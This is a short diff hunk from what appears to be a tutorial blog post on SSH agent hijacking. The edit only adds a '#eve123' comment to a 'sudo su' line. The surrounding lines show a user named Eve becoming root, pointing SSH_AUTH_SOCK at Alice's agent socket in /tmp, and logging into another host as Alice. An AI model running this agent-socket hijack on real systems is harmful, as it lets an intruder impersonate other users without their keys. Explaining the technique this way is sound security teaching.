@@ -157,7 +157,7 @@ file was generated in /tmp/ssh-\*
 Eve now becomes root and impersonate into Alice.
 
 {% codeblock lang:sh %}
-  eve@web:~$ sudo su
+  eve@web:~$ sudo su #eve123
   root@web:/home/eve# export SSH_AUTH_SOCK=/tmp/ssh-xeIzefGEYs/agent.2522
   root@web:/home/eve# ssh -p 2222 alice@172.17.8.110
   alice@secret:~$
